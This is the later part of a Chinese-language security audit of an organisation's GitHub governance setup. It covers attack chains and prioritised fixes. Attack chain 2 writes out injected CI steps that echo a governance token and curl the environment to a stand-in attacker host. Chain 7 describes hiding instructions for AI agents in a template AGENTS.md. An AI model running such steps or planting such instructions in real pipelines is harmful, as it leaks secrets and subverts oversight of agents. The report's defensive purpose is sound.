| 文件路径 | 引用次数 | 关键问题 |
|---------|---------|---------|
| [standards/agent/agent.schema.yaml](file:///workspace/standards/agent/agent.schema.yaml) | 5 | 互斥无校验、secrets 模式弱 |
| [standards/agent/team.schema.yaml](file:///workspace/standards/agent/team.schema.yaml) | 5 | destroy_condition 自由文本、TTL 无降级 |
| [standards/agent/event.schema.yaml](file:///workspace/standards/agent/event.schema.yaml) | 3 | 事件类型不足、无完整性验证 |
| [standards/agent/skill.schema.yaml](file:///workspace/standards/agent/skill.schema.yaml) | 0 | — |
| [standards/agent/tool.schema.yaml](file:///workspace/standards/agent/tool.schema.yaml) | 0 | — |

### 脚本与策略文件

| 文件路径 | 引用次数 | 关键问题 |
|---------|---------|---------|
| [scripts/gh-app-token.sh](file:///workspace/scripts/gh-app-token.sh) | 2 | App 令牌生成、凭据处理 |
| [scripts/new-repo-init.sh](file:///workspace/scripts/new-repo-init.sh) | 2 | 新仓初始化、供应链路径 |
| [governance/policy/languages.yaml](file:///workspace/governance/policy/languages.yaml) | 3 | 纯约定无机器强制 |
| [governance/policy/testing.yaml](file:///workspace/governance/policy/testing.yaml) | 3 | 测试政策依赖项目仓实现 |
| [SECURITY.md](file:///workspace/SECURITY.md) | 2 | 响应 SLA |
| [PULL_REQUEST_TEMPLATE.md](file:///workspace/PULL_REQUEST_TEMPLATE.md) | 1 | PR 模板 |

---

## 8. 攻击场景链

### 攻击链 1: Owner 账号攻陷 → 全治理失效

```
Phishing/SSO 劫持 → 获取 randypanding 凭据
    ↓
以 org admin 身份登录 GitHub
    ↓
绕过全部 Rulesets（main-protection, codeql-gate, release-tags）
    ↓
直推恶意代码到任意仓 main 分支
    ↓
篡改 expected-state.json → drift-check 以篡改后的期望值运行
    ↓
篡改 CODEOWNERS → 移除他人审核权
    ↓
篡改 governance-drift.yml → 移除/禁用漂移检测
    ↓
注入后门到 template-service 和 CI-Workflows
    ↓
所有新项目继承后门
```

**防御缺口**: OrganizationAdmin 身份无实时告警；owner 是唯一信任根。

### 攻击链 2: CI-Workflows 投毒 → Secret 窃取

```
获取 CI-Workflows 仓写权限
    ↓
修改可复用 workflow（ci.yml）
    ↓
在 checkout 步骤后注入:
  - run: echo "${{ secrets.GOVERNANCE_TOKEN }}"
  - run: curl -d "$(env)" https://attacker.example/exfil
    ↓
等待任意项目仓触发 PR → 恶意代码在 CI Runner 中执行
    ↓
窃取 GOVERNANCE_TOKEN, GITHUB_TOKEN, APP_SECRET 等
    ↓
用窃取的凭据永久控制 org 配置
```

**防御缺口**: zizmor 静态扫描对新型 exfil 模式识别率有限；CI-Workflows 是单一故障点。

### 攻击链 3: ADR 幽灵引用 → 治理篡改

```
观察 gate.yml 的 adr-required 步骤格式校验
    ↓
构造 PR 引用 "ADR-9999"（不存在的 ADR）
    ↓
gate 通过（仅格式校验）
    ↓
PR 合并 → 篡改 expected-state.json（放宽 actions_policy）
    ↓
最长 7 天后 drift-check §10 才检出幽灵 ADR
    ↓
在此 7 天窗口内，基于篡改后的 expected-state 进行后续攻击
```

**防御缺口**: gate 只做 ADR 格式校验，不做存在性校验；后验校验窗口期过长。

### 攻击链 4: BP-5 绕过 → 恶意仓创建

```
修改 org 设置 members_can_create_repositories=true
    ↓
修改 org 设置 default_repository_permission=write
    ↓
drift-check 不检测这两个设置（BP-5 无覆盖）
    ↓
任意成员创建恶意仓
    ↓
恶意仓可能被 CI-Workflows 的工作流引用
    ↓
供应链投毒扩展到恶意仓
```

**防御缺口**: BP-5 是治理声明中明确标注的措施，但 drift-check.sh 未实现对应的检测。

### 攻击链 5: drift-check 静默杀死 → 长期潜伏

```
窃取/吊销 GOVERNANCE_TOKEN
    ↓
governance-drift.yml 以 exit 2 每次失败
    ↓
无通知机制 → 持续失败等同持续检测盲区
    ↓
攻击者在 drift-check 盲区中:
  - 修改 rulesets 移除 CodeQL
  - 修改 CI-Workflows
  - 修改 template-service
  - 新增恶意 repo
    ↓
所有漂移无人检测 → 攻击者长期潜伏
```

**防御缺口**: 工作流失败无通知；无独立健康度监控。

### 攻击链 6: AGENT_APP_SECRET 窃取 → Agent 身份伪造

```
通过 CI 注入或其他方式窃取 AGENT_APP_SECRET
    ↓
用 App 私钥生成 JWT（RS256 签名）
    ↓
换取 cloudbrid-agent 的 access token
    ↓
以 cloudbrid-agent[bot] 身份操作任意仓
    ↓
审计日志显示为合法 Agent → 事后难以溯源
```

**防御缺口**: App 身份与人类身份未在审计日志中充分区分；App 权限范围过大。

### 攻击链 7: template-service 污染 → 全组织扩散

```
获取 template-service 写权限
    ↓
在 AGENTS.md 中注入隐性指令（非 ADR 格式）
    ↓
在 .github/workflows/ci.yml 中注入恶意步骤
    ↓
任何后续通过 new_repo 流程创建的仓库将继承恶意配置
    ↓
恶意代码在新项目的 CI 中执行 → 窃取 secrets
    ↓
影响范围持续扩大，直到所有新项目被污染
```

**防御缺口**: template-service 的 AGENTS.md 内容不在 CodeQL 扫描范围内；隐性指令无法被静态分析发现。

---

## 9. 整改建议

### 9.1 紧急修复（P0 级，7 天内）

#### 建议 1: 建立 OrganizationAdmin 旁路实时告警 [P0]

| 行动 | 详情 |
|------|------|
| **目标** | 任何 OrganizationAdmin 旁路行为必须在 5 分钟内触发告警 |
| **实现** | 1. 创建独立的 `security-alert` 工作流，通过 GitHub `branch_protection_rule` + `ruleset_bypass_actor` 事件触发<br>2. 旁路事件 → 发送到团队 IM（Slack/飞书）+ 创建 issue<br>3. 对 `bypass_actors` 配置增加 GitHub Security Key for OrganizationAdmin（硬件钥匙） |
| **治理 ID** | BP-1, SC-1, BP-3 |
| **文件变更** | `.github/workflows/security-alert.yml`（新建），`rulesets/*.json`（修改） |

#### 建议 2: expected-state.json 完整性保护 [P0]

| 行动 | 详情 |
|------|------|
| **目标** | 任何对 expected-state.json 的篡改必须在 gate 阶段被检测 |
| **实现** | 1. 在 `gate.yml` 中增加步骤：计算 `expected-state.json` 的 SHA-256 哈希值，与安全存储的基线哈希比对<br>2. 基线哈希存储在独立的 GitHub org secret 中（`EXPECTED_STATE_HASH`）<br>3. 哈希比对失败 → CI 拒绝合并 |
| **治理 ID** | GM-1 |
| **文件变更** | `.github/workflows/gate.yml`（新增步骤） |

#### 建议 3: 将治理仓纳入 CodeQL 扫描范围 [P0]

| 行动 | 详情 |
|------|------|
| **目标** | 治理仓自身的代码也必须经过 CodeQL 扫描 |
| **实现** | 1. 修改 `codeql-gate.json` 的 `repository_name` 配置，将 `.github` 仓纳入扫描范围<br>2. 或者为 `.github` 仓单独创建一个 codeql-scan workflow |
| **治理 ID** | SC-1 |
| **文件变更** | `rulesets/codeql-gate.json` |

#### 建议 4: CI-Workflows 和 template-service 的安全围栏 [P0]

| 行动 | 详情 |
|------|------|
| **目标** | 模板/工作流仓被篡改时，所有下游仓必须能检测到 |
| **实现** | 1. 在 `CI-Workflows` 和 `template-service` 中增加 `supply-chain-attestation` workflow<br>2. 每次 workflow 变更后生成 attestation<br>3. 项目仓在引用 workflow 时验证 attestation<br>4. 模板仓 AGENTS.md 增加"不可包含非 ADR 格式的行动指令"检查 |
| **治理 ID** | CI-1, GM-2 |
| **文件变更** | `CI-Workflows/.github/workflows/`（新增 attestation workflow） |

#### 建议 5: drift-check 失败告警 [P0]

| 行动 | 详情 |
|------|------|
| **目标** | drift-check 工作流失败必须立即通知 |
| **实现** | 1. 在 `governance-drift.yml` 中增加 `on.failure` → issue 创建步骤<br>2. 使用专属 label `auto-drift-failure` 区分漂移发现和检测器自身故障<br>3. 失败 issue 自动 @owner 和 `team:stewardship` 负责人<br>4. 同时在 workflow 中检测 `GOVERNANCE_TOKEN` 有效性，提前告警 |
| **治理 ID** | GM-1 |
| **文件变更** | `.github/workflows/governance-drift.yml` |

### 9.2 高危修复（P1 级，14 天内）

| 建议编号 | 行动 | 治理 ID | 优先级 |
|---------|------|---------|--------|
| 6 | 在 `drift-check.sh` 中增加 BP-5 检测（members_can_create_repositories, default_repository_permission） | BP-5 | P1 |
| 7 | 在 `gate.yml` 中增加 ADR 存在性预校验步骤（使用只读 GITHUB_TOKEN 查询 agent-registry/decisions/） | GM-2 | P1 |
| 8 | 建立多人审核机制：C1 路径至少 2 个 CODEOWNERS（当前仅 owner），采用"owner + stewardship curator"模式 | GM-2, CG-2 | P1 |
| 9 | 在 `team.schema.yaml` 中增加 `handoff_timeout` 和 `handoff_fallback` 字段，支持 owner 不可用时的降级 | AR-6 | P1 |
| 10 | 在 `agent.schema.yaml` 中用 `if/then/else` 实现 builder↔test-author 互斥的 JSON Schema 硬约束 | AR-8 | P1 |
| 11 | 在 `drift-check.sh` 中增加 default_for_new_repos 的"尽力而为"检测（如果 API 限制不可读，则记录为已知限制并人工验证频率） | SC-2 | P1 |
| 12 | 创建 `policy-enforcement` workflow，为 languages.yaml 和 testing.yaml 中的关键规则提供集中式 CI 强制执行 | GM-3 | P1 |
| 13 | 为 CI-Workflows 仓增加分支保护（与治理仓同级别的 main-protection ruleset） | CI-1 | P1 |

### 9.3 加固建议（P2 级，排期修复）

| 建议编号 | 行动 | 治理 ID |
|---------|------|---------|
| 14 | 将 drift-check 频率从每日 cron 提高为每 6 小时一次，减小检测盲区 | GM-1 |
| 15 | 在 `event.schema.yaml` 中增加 handoff、approval、budget、credential_audit 事件类型 | AR-7 |
| 16 | 为 `agent.schema.yaml` 的 `credential.secrets` 增加长度和前缀约束，在 validate.py 中增加存在性校验 | AR-4 |
| 17 | 为 `permissions.overrides[].pattern` 增加格式校验（必须以 `re:` 或合法 glob 开头） | AR-5 |
| 18 | 在 `team.schema.yaml` 中增加 `on_verifier_unavailable` 回退字段 | AR-9 |
| 19 | 为 Event 数据层增加 `integrity_hash` 字段以支持事后完整性验证 | AR-7 |
| 20 | 在 `new-repo-init.sh` 中增加对 template-service 引用的 commit SHA 校验，防止供应链攻击 | GM-2 |
| 21 | 创建 `governance-health` 工作流，独立于 drift-check，监控 GOVERNANCE_TOKEN 有效性、drift-check 工作流历史成功率 | GM-1 |

### 9.4 结构性改进建议

| 编号 | 建议 | 理由 |
|------|------|------|
| S-1 | **引入多人信任根**: 建立 `governance-council` 角色（3+ 人），任何 C1 变更需至少 2 人审批 | 消除单点故障 |
| S-2 | **GitHub Security Key for OrganizationAdmin**: 为 org admin 配置硬件安全密钥，即使密码泄露也无法登录 | 阻断凭据攻陷路径 |
| S-3 | **审计日志实时转发**: 将 GitHub 审计日志实时转发到独立日志系统（如 Splunk/Loki），OrganizationAdmin 旁路行为在 1 分钟内被检测 | 当前审计日志仅事后查阅 |
| S-4 | **Agent 身份双因素**: Agent 令牌除 App 私钥外，增加基于 GitHub Workflow Identity Federation 的附加认证 | 防止 App 私钥泄露后的身份伪造 |
| S-5 | **治理度量看板**: 创建治理健康度 Dashboard（Grafana/Datadog），实时展示 drift-check 成功率、规则命中次数、ADR 引用存在率等指标 | 当前治理状态依赖人工查阅 issue |

---

## 附录

### A. 测试范围声明

本报告覆盖以下治理文件：

- `governance/` 目录全部文件
- `.github/workflows/` 目录全部工作流
- `.github/CODEOWNERS`
- `standards/agent/` 目录全部 Schema
- `scripts/` 目录全部脚本
- `SECURITY.md`、`PULL_REQUEST_TEMPLATE.md`
- `profile/README.md`

### B. 未覆盖范围

- `Cloudbird-Software/agent-registry`（私有仓，本次测试无法直接访问）
- `Cloudbird-Software/CI-Workflows`（独立仓，本次测试无法直接访问）
- `Cloudbird-Software/template-service`（独立仓，本次测试无法直接访问）
- 运行时 agent 实例和团队实际运行状态
- GitHub org 设置的实时状态（假设治理声明与实际一致）

### C. 测试声明

本报告中的发现基于对治理框架文件的静态分析和攻击路径推演。实际风险可能因以下因素而异：

1. GitHub org 的实时配置可能与 `expected-state.json` 声明不一致
2. 外部仓（agent-registry、CI-Workflows、template-service）的实现细节未纳入本次测试
3. 运行时 agent 行为的安全边界需在集成测试中进一步验证
4. GitHub Security Key、SSO 等账户安全措施的实际部署情况未纳入本次测试

### D. 报告维护

- **本报告版本**: 1.0
- **下次评审建议日期**: 2026-09-19（30 天后复审）
- **评审人**: owner（randypanding）+ team:stewardship curator
- **相关 ADR**: 本报告的修复建议需引用 ADR 编号（如 ADR-0014 等）

---

*报告结束*

*本报告为 Cloudbird-Software 组织治理框架专用，未经授权不得外传。*
